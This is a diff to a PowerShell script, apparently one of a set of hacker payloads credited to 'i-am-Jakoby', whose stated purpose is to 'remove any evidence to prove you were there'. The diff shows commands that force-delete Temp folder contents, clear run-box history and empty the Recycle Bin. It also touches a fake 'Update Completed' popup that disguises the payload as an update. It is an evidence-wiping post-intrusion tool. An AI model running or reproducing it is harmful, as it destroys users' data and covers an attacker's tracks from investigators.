@@ -41,6 +41,7 @@ try {
 }
 ############################################################################################################################################################
 
+#Credit goes to i-am-Jakoby, Luther, & Hobo. Amazing person and hacker.  
 <#
 .NOTES 
 	This is to clean up behind you and remove any evidence to prove you were there
@@ -48,7 +49,7 @@ try {
 
 # Delete contents of Temp folder 
 
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+# rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
 # Delete run box history
 
@@ -65,6 +66,7 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 		
 ############################################################################################################################################################
 
+# Need to configure this in
 # Popup message to signal the payload is done
+#$done = New-Object -ComObject Wscript.Shell;$done.Popup("Update Completed",1)
 
-$done = New-Object -ComObject Wscript.Shell;$done.Popup("Update Completed",1)
